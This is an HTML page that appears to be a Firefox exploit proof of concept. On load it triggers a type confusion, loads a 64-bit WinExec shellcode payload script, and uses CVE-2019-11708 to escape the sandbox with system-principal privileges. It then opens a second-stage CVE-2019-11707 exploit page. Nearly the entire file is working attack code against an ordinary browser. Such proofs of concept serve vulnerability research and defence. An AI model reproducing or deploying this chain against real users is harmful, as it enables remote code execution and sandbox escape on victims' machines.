<html>
<body>
<head>
<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding">
<script src="./../Payloads/Compiled/JS/WinExecSleep_Uint8Array_64-bit.js">
</script>
<script>

function run()
{

    if( window.netscape.security.PrivilegeManager == undefined )
    {
        try{
            confusion();    //if it didn't work reload the page 
        }                   //(sometimes the confusion does not get triggeret on first load)
        catch (error) {}
        finally{
            location.reload();
        }
    }else{
        /* use CVE-2019-11708 to escape the sandbox */
        /* this part is taken from exploit by 0vercl0k (https://github.com/0vercl0k/CVE-2019-11708) */
        window.netscape.security.PrivilegeManager.enablePrivilege();
        const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
        const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());

        const Code = _GetDocShellFromWindow.toSource();
        Components.utils.evalInSandbox(Code, Sbx);
        const DocShell = Sbx._GetDocShellFromWindow(window);
        Components.utils.nukeSandbox(Sbx);
        //DocShell.messageManager.sendSyncMessage('Prompt:Open', { uri: `${location.origin}/stage2.html` });
		//DocShell.messageManager.sendSyncMessage('Prompt:Open', { uri: "file:///C:/Users/PrimaryUser/Documents/GitHub/Exploits/CVE-2019-11708/CVE-2019-9791/alert.html" });
		DocShell.messageManager.sendSyncMessage('Prompt:Open', { uri: "file:///C:/Users/PrimaryUser/Documents/GitHub/Exploits/CVE-2019-11707/Forrest_Orr_CVE-2019-11707_64-bit.html" });
        document.write("<h1> Success! ...</h1>")
    }
}

function _GetDocShellFromWindow(Win) {
    return Win.docShell;
}

</script>
</head>
<body>
<script type="text/javascript">
    window.addEventListener('load', (event) => { run(); });
</script>
</body>
</html>
